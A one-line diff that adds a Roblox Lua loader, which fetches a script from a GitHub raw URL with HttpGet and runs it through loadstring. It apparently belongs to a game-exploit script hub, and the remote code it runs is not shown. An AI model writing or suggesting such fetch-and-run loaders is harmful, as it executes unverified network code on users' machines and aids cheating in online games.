@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Allusia1/HereYouGo/main/ItsDone.lua"))()
